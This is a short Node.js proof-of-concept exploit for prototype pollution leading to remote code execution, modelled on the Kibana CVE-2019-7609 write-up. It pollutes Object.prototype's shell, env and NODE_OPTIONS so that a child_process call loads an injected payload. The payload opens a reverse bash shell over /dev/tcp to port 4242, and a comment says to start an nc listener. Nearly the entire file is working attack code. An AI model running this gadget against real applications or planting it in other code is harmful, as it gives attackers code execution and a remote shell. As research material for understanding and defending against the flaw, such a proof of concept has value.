﻿// FIXED !!!
// we can only add a new env var but not rewrite them

// based on https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/
// run `nc -lnvp 4242`
const { spawn, spawnSync, exec, execSync } = require('child_process');

Object.prototype.shell = "node";
Object.prototype.env = {};
Object.prototype.env.AAAA = 'require("child_process").execSync("bash -i >& /dev/tcp/127.0.0.1/4242 0>&1", {shell: "/bin/bash"});process.exit()//';
Object.prototype.env.NODE_OPTIONS = '--require /proc/self/environ';

const output = execSync('ping -c 4 127.0.0.1');
console.log(output.toString());
